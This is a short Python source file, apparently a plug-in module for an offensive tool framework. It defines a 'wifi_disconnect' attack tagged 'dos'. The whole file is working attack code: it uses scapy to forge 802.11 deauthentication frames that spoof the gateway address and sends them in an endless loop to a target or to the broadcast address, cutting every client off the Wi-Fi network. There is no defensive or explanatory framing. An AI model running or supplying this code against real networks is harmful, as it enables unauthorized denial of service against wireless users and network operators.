from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.sendrecv import sendp

from module import Module, Type


class WIFIDisconnect(Module):

    def __init__(self):
        super().__init__("wifi_disconnect",
                         ["wifi", "disconnect", "dos"],
                         "disconnect users from wifi")

        self.add_option("TARGET-MAC", "target mac address", required=True, default="ff:ff:ff:ff:ff:ff", type=Type.mac)
        self.add_option("GATEWAY-MAC", "gateway mac address", required=True, type=Type.mac)
        self.add_option("INTERFACE", "network interface", required=True, type=Type.interface)

    def run(self):
        pkt = RadioTap() / Dot11(addr1=self.target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / Dot11Deauth(reason=7)

        sendp(pkt, inter=0.1, loop=True, iface=self.interface, verbose=False)
